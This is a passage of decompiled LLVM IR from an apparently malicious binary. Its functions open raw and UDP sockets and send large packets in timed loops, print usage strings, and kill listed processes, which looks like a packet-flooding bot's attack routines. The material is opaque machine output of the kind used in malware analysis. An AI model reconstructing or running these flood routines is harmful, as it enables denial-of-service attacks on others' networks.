  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_a2a4 ], [ %v1_a730, %dec_label_pc_a72c ]
  %v0_a4c8 = call i32 @function_10c88()
  %v2_a4dc = load i32, i32* %v1_a4a0, align 4
  store i32 %v2_a4dc, i32* @r0, align 4
  %v1_a4e4 = call i32 @function_11290(i32 %v2_a4dc)
  %v2_a4ec = icmp eq i32 %v1_a4e4, 0
  br i1 %v2_a4ec, label %dec_label_pc_a4f4, label %dec_label_pc_a500

dec_label_pc_a4f4:                                ; preds = %dec_label_pc_a4c8
  %v0_a4f4 = call i32 @function_10c88()
  br label %dec_label_pc_a500

dec_label_pc_a500:                                ; preds = %dec_label_pc_a4c8, %dec_label_pc_a4f4
  %v0_a500 = call i32 @function_8570()
  %v1_a528 = call i32 @function_f8a4(i32 60)
  %v0_a534 = call i32 @function_10c88()
  %v3_a568 = urem i32 %v0_a4c8, 65536
  store i32 %v3_a568, i32* %stack_var_-96, align 4
  %v0_a580 = call i32 @function_10c88()
  store i32 2, i32* %stack_var_-184, align 4
  %v3_a5c0 = call i32 @function_8d94(i16* %v2_a5c0, i32 20)
  %v0_a5cc = call i32 @function_10c88()
  store i32 %v0_a500, i32* %stack_var_-168, align 4
  %v1_a650 = call i32 @function_f8a4(i32 40)
  store i32 %v2_a668, i32* @r3, align 4
  store i32 20, i32* @r2, align 4
  %v3_a678 = call i32 @function_f340(i32 %v2_a660, i32 %v2_a668, i32 20)
  store i32 %v2_a688, i32* @r3, align 4
  store i32 20, i32* @r2, align 4
  %v3_a698 = call i32 @function_f340(i32 %v2_a680, i32 %v2_a688, i32 20)
  %v3_a6b0 = call i32 @function_8d94(i16* %v2_a6b0, i32 52)
  %v6_a6e8 = call i32 @function_fc10(i32 %v3_a224, i32 %v2_a5b4, i32 60, i32 0, i32 %v2_a6c4, i32 16)
  %tmp = icmp ult i32 %stack_var_-56.0, 50
  br i1 %tmp, label %dec_label_pc_a72c, label %dec_label_pc_a6f8

dec_label_pc_a6f8:                                ; preds = %dec_label_pc_a500
  %v2_a6fc = call i32 @function_cbf4(i32* null)
  %v3_a714 = icmp ult i32 %v2_a6fc, %v2_a710
  br i1 %v3_a714, label %dec_label_pc_a724, label %dec_label_pc_a71c

dec_label_pc_a71c:                                ; preds = %dec_label_pc_a6f8
  %v1_a720 = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_a724

dec_label_pc_a724:                                ; preds = %dec_label_pc_a6f8, %dec_label_pc_a71c
  br label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a500, %dec_label_pc_a724
  %stack_var_-56.1 = phi i32 [ %stack_var_-56.0, %dec_label_pc_a500 ], [ 0, %dec_label_pc_a724 ]
  %v1_a730 = add i32 %stack_var_-56.1, 1
  br label %dec_label_pc_a4c8

dec_label_pc_a73c:                                ; preds = %dec_label_pc_a184
  ret i32 %v1_a1e4

; uselistorder directives
  uselistorder i32 %stack_var_-56.0, { 1, 0 }
  uselistorder i32 %storemerge1112, { 2, 0, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a72c, { 1, 0 }
  uselistorder label %dec_label_pc_a724, { 1, 0 }
  uselistorder label %dec_label_pc_a500, { 1, 0 }
  uselistorder label %dec_label_pc_a250, { 1, 0 }
  uselistorder label %dec_label_pc_a298.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a218, { 1, 0 }
}

define i32 @function_a754(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a754:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-116 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  store i32 42848, i32* %stack_var_-4, align 4
  %v2_a75c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a75c, i32* @fp, align 4
  %v2_a784 = call i32 @function_cbf4(i32* null)
  %v1_a794 = call i32 @function_8400(i32 %arg2)
  %v2_a79c = icmp eq i32 %v1_a794, 0
  br i1 %v2_a79c, label %dec_label_pc_a7a4, label %dec_label_pc_ac44

dec_label_pc_a7a4:                                ; preds = %dec_label_pc_a754
  %v8_a7ac = icmp sgt i32 %arg3, 1
  br i1 %v8_a7ac, label %dec_label_pc_a7c8, label %dec_label_pc_a7b0

dec_label_pc_a7b0:                                ; preds = %dec_label_pc_a7a4
  store i32 %arg2, i32* @r2, align 4
  %v3_a7bc = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_18af4.120 to i32))
  %v1_a7c4 = call i32 @function_1148c(i32 1)
  br label %dec_label_pc_a7c8

dec_label_pc_a7c8:                                ; preds = %dec_label_pc_a7a4, %dec_label_pc_a7b0
  %v1_a7cc = add i32 %arg4, 8
  %v1_a7d0 = inttoptr i32 %v1_a7cc to i32*
  %v2_a7d0 = load i32, i32* %v1_a7d0, align 4
  store i32 %v2_a7d0, i32* @r0, align 4
  %v1_a7d8 = call i32 @function_11290(i32 %v2_a7d0)
  %v3_a7f0 = call i32 @function_fc94(i32 2, i32 3, i32 255)
  %v1_a800 = icmp slt i32 %v3_a7f0, 0
  br i1 %v1_a800, label %dec_label_pc_a808, label %dec_label_pc_a810

dec_label_pc_a808:                                ; preds = %dec_label_pc_a7c8
  %v1_a80c = call i32 @function_1148c(i32 1)
  br label %dec_label_pc_a810

dec_label_pc_a810:                                ; preds = %dec_label_pc_a7c8, %dec_label_pc_a808
  %v2_a814 = call i32 @function_cbf4(i32* null)
  store i32 %v2_a814, i32* @r0, align 4
  store i32 %v2_a814, i32* @r4, align 4
  %v0_a81c = call i32 @function_cbe0()
  %v0_a824 = load i32, i32* @r4, align 4
  %v2_a824 = xor i32 %v0_a824, %v0_a81c
  %v1_a82c = call i32 @function_10ebc(i32 %v2_a824)
  %v0_a830 = call i32 @function_10c88()
  %v2_a83c = ptrtoint i32* %stack_var_-76 to i32
  store i32 1400, i32* @r2, align 4
  %v2_a84c = bitcast i32* %stack_var_-76 to i8*
  %v3_a84c = call i32 @function_f240(i8* %v2_a84c, i32 %v0_a830)
  %v1_a854 = add i32 %arg4, 4
  %v1_a858 = inttoptr i32 %v1_a854 to i32*
  %v2_a858 = load i32, i32* %v1_a858, align 4
  %v2_a864 = call i32 @function_9d18(i32 %arg2, i32 %v2_a858)
  store i32 %arg2, i32* @r2, align 4
  %v3_a888 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_18b18.122 to i32))
  %v2_aae4 = ptrtoint i8* %stack_var_-116 to i32
  %v2_aaf0 = bitcast i8* %stack_var_-116 to i16*
  %v2_ab60 = ptrtoint i32* %stack_var_-96 to i32
  %v2_ab68 = ptrtoint i32* %stack_var_-156 to i32
  %v2_ab88 = ptrtoint i32* %stack_var_-136 to i32
  %v2_abb0 = bitcast i32* %stack_var_-168 to i16*
  %v2_abc4 = ptrtoint i32* %stack_var_-184 to i32
  %v2_ac10 = add i32 %v1_a7d8, %v2_a784
  br label %dec_label_pc_a88c

dec_label_pc_a88c:                                ; preds = %dec_label_pc_ac24, %dec_label_pc_a810
  %stack_var_-48.0 = phi i32 [ %tmp, %dec_label_pc_a810 ], [ %v1_ac28, %dec_label_pc_ac24 ]
  %v0_a88c = call i32 @function_8570()
  store i8 69, i8* %stack_var_-116, align 1
  %v1_a8fc = call i32 @function_f8a4(i32 1440)
  %v0_a908 = call i32 @function_10c88()
  %v0_a94c = call i32 @function_10c88()
  %v3_a958 = urem i32 %v0_a94c, 65536
  store i32 %v3_a958, i32* %stack_var_-96, align 4
  %v0_a960 = call i32 @function_10c88()
  %v0_a974 = call i32 @function_10c88()
  %v0_a980 = call i32 @function_10c88()
  store i32 2, i32* %stack_var_-184, align 4
  %v3_aaf0 = call i32 @function_8d94(i16* %v2_aaf0, i32 20)
  %v3_ab08 = call i32 @function_8d94(i16* %v2_aaf0, i32 40)
  store i32 %v0_a88c, i32* %stack_var_-168, align 4
  %v1_ab50 = call i32 @function_f8a4(i32 1420)
  store i32 %v2_ab68, i32* @r3, align 4
  store i32 20, i32* @r2, align 4
  %v3_ab78 = call i32 @function_f340(i32 %v2_ab60, i32 %v2_ab68, i32 20)
  store i32 %v2_ab88, i32* @r3, align 4
  store i32 1400, i32* @r2, align 4
  %v3_ab98 = call i32 @function_f340(i32 %v2_a83c, i32 %v2_ab88, i32 1400)
  %v3_abb0 = call i32 @function_8d94(i16* %v2_abb0, i32 1432)
  %v6_abe8 = call i32 @function_fc10(i32 %v3_a7f0, i32 %v2_aae4, i32 1440, i32 0, i32 %v2_abc4, i32 16)
  %tmp71 = icmp ult i32 %stack_var_-48.0, 50
  br i1 %tmp71, label %dec_label_pc_ac24, label %dec_label_pc_abf8

dec_label_pc_abf8:                                ; preds = %dec_label_pc_a88c
  %v2_abfc = call i32 @function_cbf4(i32* null)
  %v3_ac14 = icmp ult i32 %v2_abfc, %v2_ac10
  br i1 %v3_ac14, label %dec_label_pc_ac1c, label %dec_label_pc_ac34

dec_label_pc_ac1c:                                ; preds = %dec_label_pc_abf8
  br label %dec_label_pc_ac24

dec_label_pc_ac24:                                ; preds = %dec_label_pc_a88c, %dec_label_pc_ac1c
  %stack_var_-48.1 = phi i32 [ %stack_var_-48.0, %dec_label_pc_a88c ], [ 0, %dec_label_pc_ac1c ]
  %v1_ac28 = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_a88c

dec_label_pc_ac34:                                ; preds = %dec_label_pc_abf8
  %v1_ac38 = call i32 @function_cda4(i32 %v3_a7f0)
  %v1_ac40 = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_ac44

dec_label_pc_ac44:                                ; preds = %dec_label_pc_a754, %dec_label_pc_ac34
  %v1_ac4c = phi i32 [ %v1_a794, %dec_label_pc_a754 ], [ %v1_ac40, %dec_label_pc_ac34 ]
  ret i32 %v1_ac4c

; uselistorder directives
  uselistorder i32 %stack_var_-48.0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %stack_var_-116, { 2, 0, 1 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i8 69, { 1, 2, 0 }
  uselistorder i32 ()* @function_8570, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ac44, { 1, 0 }
  uselistorder label %dec_label_pc_ac24, { 1, 0 }
  uselistorder label %dec_label_pc_a810, { 1, 0 }
  uselistorder label %dec_label_pc_a7c8, { 1, 0 }
}

define i32 @function_ac58(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ac58:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 44132, i32* %stack_var_-4, align 4
  %v2_ac60 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ac60, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_ac84 = call i32 @function_fd60(i32 9216)
  %v2_ac94 = call i32 @function_cbf4(i32* null)
  %v1_aca4 = call i32 @function_8400(i32 %arg2)
  %v2_acac = icmp eq i32 %v1_aca4, 0
  br i1 %v2_acac, label %dec_label_pc_acb4, label %dec_label_pc_ae28

dec_label_pc_acb4:                                ; preds = %dec_label_pc_ac58
  %v8_acbc = icmp sgt i32 %arg3, 1
  br i1 %v8_acbc, label %dec_label_pc_acd8, label %dec_label_pc_acc0

dec_label_pc_acc0:                                ; preds = %dec_label_pc_acb4
  store i32 %arg2, i32* @r2, align 4
  %v3_accc = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_18b3c.124 to i32))
  %v1_acd4 = call i32 @function_1148c(i32 1)
  br label %dec_label_pc_acd8

dec_label_pc_acd8:                                ; preds = %dec_label_pc_acb4, %dec_label_pc_acc0
  %v1_acdc = add i32 %arg4, 8
  %v1_ace0 = inttoptr i32 %v1_acdc to i32*
  %v2_ace0 = load i32, i32* %v1_ace0, align 4
  store i32 %v2_ace0, i32* @r0, align 4
  %v1_ace8 = call i32 @function_11290(i32 %v2_ace0)
  %v2_acf4 = ptrtoint i32* %stack_var_-60 to i32
  store i32 16, i32* @r2, align 4
  %v2_ad04 = bitcast i32* %stack_var_-60 to i8*
  %v3_ad04 = call i32 @function_f240(i8* %v2_ad04, i32 0)
  %v1_ad0c = add i32 %arg4, 4
  %v1_ad10 = inttoptr i32 %v1_ad0c to i32*
  %v2_ad10 = load i32, i32* %v1_ad10, align 4
  %v2_ad1c = call i32 @function_9d18(i32 %arg2, i32 %v2_ad10)
  store i32 2, i32* %stack_var_-60, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_ad48 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_18b60.126 to i32))
  %v2_adf4 = add i32 %v1_ace8, %v2_ac94
  %v2_ad8c = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_ad4c

dec_label_pc_ad4c:                                ; preds = %dec_label_pc_ae08, %dec_label_pc_acd8
  %stack_var_-36.0 = phi i32 [ %tmp, %dec_label_pc_acd8 ], [ %v1_ae0c, %dec_label_pc_ae08 ]
  %v0_ad4c = call i32 @function_10c88()
  %v3_ad6c = call i32 @function_fc94(i32 2, i32 2, i32 17)
  %v1_ad7c = icmp slt i32 %v3_ad6c, 0
  br i1 %v1_ad7c, label %dec_label_pc_add0, label %dec_label_pc_ad84

dec_label_pc_ad84:                                ; preds = %dec_label_pc_ad4c
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %v2_ad8c, i32* @r3, align 4
  %v3_ada0 = call i32 @function_cd50(i32 %v3_ad6c, i32 21537, i32 %v2_ad8c)
  %v6_adc4 = call i32 @function_fc10(i32 %v3_ad6c, i32 %v1_ac84, i32 9216, i32 0, i32 %v2_acf4, i32 16)
  %v1_adcc = call i32 @function_cda4(i32 %v3_ad6c)
  br label %dec_label_pc_add0

dec_label_pc_add0:                                ; preds = %dec_label_pc_ad4c, %dec_label_pc_ad84
  %v7_add8 = icmp slt i32 %stack_var_-36.0, 50
  br i1 %v7_add8, label %dec_label_pc_ae08, label %dec_label_pc_addc

dec_label_pc_addc:                                ; preds = %dec_label_pc_add0
  %v2_ade0 = call i32 @function_cbf4(i32* null)
  %v3_adf8 = icmp ult i32 %v2_ade0, %v2_adf4
  br i1 %v3_adf8, label %dec_label_pc_ae00, label %dec_label_pc_ae18

dec_label_pc_ae00:                                ; preds = %dec_label_pc_addc
  br label %dec_label_pc_ae08

dec_label_pc_ae08:                                ; preds = %dec_label_pc_add0, %dec_label_pc_ae00
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0, %dec_label_pc_add0 ], [ 0, %dec_label_pc_ae00 ]
  %v1_ae0c = add i32 %stack_var_-36.1, 1
  br label %dec_label_pc_ad4c

dec_label_pc_ae18:                                ; preds = %dec_label_pc_addc
  %v1_ae1c = call i32 @function_cda4(i32 %v3_ad6c)
  %v1_ae24 = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_ae28

dec_label_pc_ae28:                                ; preds = %dec_label_pc_ac58, %dec_label_pc_ae18
  %v1_ae30 = phi i32 [ %v1_aca4, %dec_label_pc_ac58 ], [ %v1_ae24, %dec_label_pc_ae18 ]
  ret i32 %v1_ae30

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 50, { 3, 0, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_fc10, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_9d18, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ae28, { 1, 0 }
  uselistorder label %dec_label_pc_ae08, { 1, 0 }
  uselistorder label %dec_label_pc_add0, { 1, 0 }
  uselistorder label %dec_label_pc_acd8, { 1, 0 }
}

define i32 @function_ae3c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ae3c:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 44616, i32* %stack_var_-4, align 4
  %v2_ae44 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ae44, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-32, align 4
  %v5_ae64 = icmp sgt i32 %arg3, 0
  br i1 %v5_ae64, label %dec_label_pc_ae80, label %dec_label_pc_ae68

dec_label_pc_ae68:                                ; preds = %dec_label_pc_ae3c
  store i32 %arg2, i32* @r2, align 4
  %v3_ae74 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_18b7c.128 to i32))
  %v1_ae7c = call i32 @function_1148c(i32 1)
  %v3_ae80.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_ae80

dec_label_pc_ae80:                                ; preds = %dec_label_pc_ae3c, %dec_label_pc_ae68
  %v3_ae80 = phi i32 [ %arg4, %dec_label_pc_ae3c ], [ %v3_ae80.pre, %dec_label_pc_ae68 ]
  %v1_ae84 = add i32 %v3_ae80, 4
  %v1_ae88 = inttoptr i32 %v1_ae84 to i32*
  %v2_ae88 = load i32, i32* %v1_ae88, align 4
  %v1_ae90 = call i32 @function_f7d0(i32 %v2_ae88)
  store i32 %v1_ae90, i32* @global_var_25710.130, align 4
  store i32 1, i32* @global_var_22ea0.132, align 4
  %v1_aeb4 = call i32 @function_cda4(i32 %arg1)
  ret i32 %v1_aeb4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ae80, { 1, 0 }
}

define i32 @function_aed0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_aed0:
  %stack_var_-4 = alloca i32, align 4
  store i32 44764, i32* %stack_var_-4, align 4
  %v2_aed8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_aed8, i32* @fp, align 4
  %v1_aef4 = call i32 @function_8400(i32 %arg2)
  %v2_aefc = icmp eq i32 %v1_aef4, 0
  br i1 %v2_aefc, label %dec_label_pc_af04, label %dec_label_pc_b09c

dec_label_pc_af04:                                ; preds = %dec_label_pc_aed0
  store i32 %arg2, i32* @r2, align 4
  %v3_af10 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([119 x i8]* @global_var_18b98.134 to i32))
  %v1_af18 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_af28 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([123 x i8]* @global_var_18c10.136 to i32))
  %v1_af30 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_af40 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([77 x i8]* @global_var_18c8c.138 to i32))
  %v1_af48 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_af58 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_18cdc.140 to i32))
  %v1_af60 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_af70 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([94 x i8]* @global_var_18d3c.142 to i32))
  %v1_af78 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_af88 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([79 x i8]* @global_var_18d9c.144 to i32))
  %v1_af90 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_afa0 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([89 x i8]* @global_var_18dec.146 to i32))
  %v1_afa8 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_afb8 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_18e48.148 to i32))
  %v1_afc0 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_afd0 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([103 x i8]* @global_var_18ea4.150 to i32))
  %v1_afd8 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_afe8 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_18f0c.152 to i32))
  %v1_aff0 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_b000 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([80 x i8]* @global_var_18f74.154 to i32))
  %v1_b008 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_b018 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([117 x i8]* @global_var_18fc4.156 to i32))
  %v1_b020 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_b030 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([90 x i8]* @global_var_1903c.158 to i32))
  %v1_b038 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_b048 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([91 x i8]* @global_var_19098.160 to i32))
  %v1_b050 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_b060 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([77 x i8]* @global_var_190f4.162 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_b070 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([96 x i8]* @global_var_19144.164 to i32))
  %v1_b078 = call i32 @function_11544(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_b088 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([82 x i8]* @global_var_191a4.166 to i32))
  %v1_b090 = call i32 @function_11544(i32 2)
  %v1_b098 = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_b09c

dec_label_pc_b09c:                                ; preds = %dec_label_pc_aed0, %dec_label_pc_af04
  %v1_b0a4 = phi i32 [ %v1_aef4, %dec_label_pc_aed0 ], [ %v1_b098, %dec_label_pc_af04 ]
  ret i32 %v1_b0a4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_b09c, { 1, 0 }
}

define i32 @function_b0ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b0ec:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 45304, i32* %stack_var_-4, align 4
  %v2_b0f4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b0f4, i32* @fp, align 4
  %v0_b0fc = load i32, i32* @r0, align 4
  %v2_b16c = icmp eq i32 %arg2, 0
  %v2_b1d814 = load i32, i32* @global_var_22eb0.14, align 4
  %v3_b1e016 = icmp eq i32 %v2_b1d814, 0
  br i1 %v3_b1e016, label %dec_label_pc_b1e8, label %dec_label_pc_b118

dec_label_pc_b118:                                ; preds = %dec_label_pc_b1c8, %dec_label_pc_b0ec
  %storemerge122 = phi i32 [ %v1_b1cc, %dec_label_pc_b1c8 ], [ 0, %dec_label_pc_b0ec ]
  %v1_b1f021 = phi i32 [ %v1_b1f02, %dec_label_pc_b1c8 ], [ %v0_b0fc, %dec_label_pc_b0ec ]
  %v3_b11c = mul i32 %storemerge122, 4
  %v2_b128 = load i32, i32* @global_var_2571c.16, align 4
  %v2_b12c = add i32 %v2_b128, %v3_b11c
  %v1_b130 = inttoptr i32 %v2_b12c to i32*
  %v2_b130 = load i32, i32* %v1_b130, align 4
  %v2_b134 = icmp eq i32 %v2_b130, 0
  br i1 %v2_b134, label %dec_label_pc_b1c8, label %dec_label_pc_b13c

dec_label_pc_b13c:                                ; preds = %dec_label_pc_b118
  %v2_b154 = load i32, i32* %v1_b130, align 4
  store i32 %v2_b154, i32* @r4, align 4
  %v0_b158 = call i32 @function_cbe0()
  store i32 %v0_b158, i32* @r0, align 4
  %v0_b160 = load i32, i32* @r4, align 4
  %v9_b160 = icmp eq i32 %v0_b160, %v0_b158
  br i1 %v9_b160, label %dec_label_pc_b1c8, label %dec_label_pc_b168

dec_label_pc_b168:                                ; preds = %dec_label_pc_b13c
  br i1 %v2_b16c, label %dec_label_pc_b1a0, label %dec_label_pc_b174

dec_label_pc_b174:                                ; preds = %dec_label_pc_b168
  store i32 %arg2, i32* @r2, align 4
  %v3_b19c = call i32 @function_8398(i32 %v0_b0fc, i32 ptrtoint ([28 x i8]* @global_var_191f8.169 to i32))
  br label %dec_label_pc_b1a0

dec_label_pc_b1a0:                                ; preds = %dec_label_pc_b168, %dec_label_pc_b174
  %v2_b1b0 = load i32, i32* @global_var_2571c.16, align 4
  %v2_b1b4 = add i32 %v2_b1b0, %v3_b11c
  %v1_b1b8 = inttoptr i32 %v2_b1b4 to i32*
  %v2_b1b8 = load i32, i32* %v1_b1b8, align 4
  %v2_b1c4 = call i32 @function_ccb4(i32 %v2_b1b8, i32 9)
  store i32 %v2_b1c4, i32* @r0, align 4
  br label %dec_label_pc_b1c8

dec_label_pc_b1c8:                                ; preds = %dec_label_pc_b13c, %dec_label_pc_b118, %dec_label_pc_b1a0
  %v1_b1f02 = phi i32 [ %v0_b158, %dec_label_pc_b13c ], [ %v1_b1f021, %dec_label_pc_b118 ], [ %v2_b1c4, %dec_label_pc_b1a0 ]
  %v1_b1cc = add i32 %storemerge122, 1
  %v2_b1d8 = load i32, i32* @global_var_22eb0.14, align 4
  %v3_b1e0 = icmp ult i32 %v1_b1cc, %v2_b1d8
  br i1 %v3_b1e0, label %dec_label_pc_b118, label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1c8, %dec_label_pc_b0ec
  %v1_b1f0.lcssa = phi i32 [ %v0_b0fc, %dec_label_pc_b0ec ], [ %v1_b1f02, %dec_label_pc_b1c8 ]
  ret i32 %v1_b1f0.lcssa

; uselistorder directives
  uselistorder i32 %v1_b1cc, { 1, 0 }
  uselistorder i32 %v3_b11c, { 1, 0 }
  uselistorder i32 %storemerge122, { 1, 0 }
  uselistorder i32 %v0_b0fc, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_b1c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b1a0, { 1, 0 }
}

define i32 @function_b200(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b200:
  store i32 %arg3, i32* @r2, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 45580, i32* %stack_var_-4, align 4
  %v2_b208 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b208, i32* @fp, align 4
  %v3_b228 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_18530.12 to i32))
  ret i32 %v3_b228

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_b23c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b23c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-2144 = alloca i32, align 4
  %stack_var_-1120 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 45640, i32* %stack_var_-4, align 4
  %v2_b244 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b244, i32* @fp, align 4
  br label %dec_label_pc_b274

dec_label_pc_b268:                                ; preds = %dec_label_pc_b28c
  %v1_b26c = add i32 %storemerge8, 1
  br label %dec_label_pc_b274

dec_label_pc_b274:                                ; preds = %dec_label_pc_b23c, %dec_label_pc_b268
  %storemerge8 = phi i32 [ 0, %dec_label_pc_b23c ], [ %v1_b26c, %dec_label_pc_b268 ]
  store i32 %arg3, i32* @r0, align 4
  %v0_b27c = call i32 @function_f2e0()
  store i32 %v0_b27c, i32* %r0.global-to-local, align 4
  %v3_b284 = icmp ult i32 %storemerge8, %v0_b27c
  br i1 %v3_b284, label %dec_label_pc_b28c, label %dec_label_pc_b274.dec_label_pc_b2a8_crit_edge

dec_label_pc_b274.dec_label_pc_b2a8_crit_edge:    ; preds = %dec_label_pc_b274
  %.pre = add i32 %storemerge8, %arg3
  %.pre24 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_b2a8

dec_label_pc_b28c:                                ; preds = %dec_label_pc_b274
  %v2_b298 = add i32 %storemerge8, %arg3
  %v1_b29c = inttoptr i32 %v2_b298 to i8*
  %v2_b29c = load i8, i8* %v1_b29c, align 1
  %v7_b2a0 = icmp eq i8 %v2_b29c, 32
  br i1 %v7_b2a0, label %dec_label_pc_b2a8, label %dec_label_pc_b268

dec_label_pc_b2a8:                                ; preds = %dec_label_pc_b28c, %dec_label_pc_b274.dec_label_pc_b2a8_crit_edge
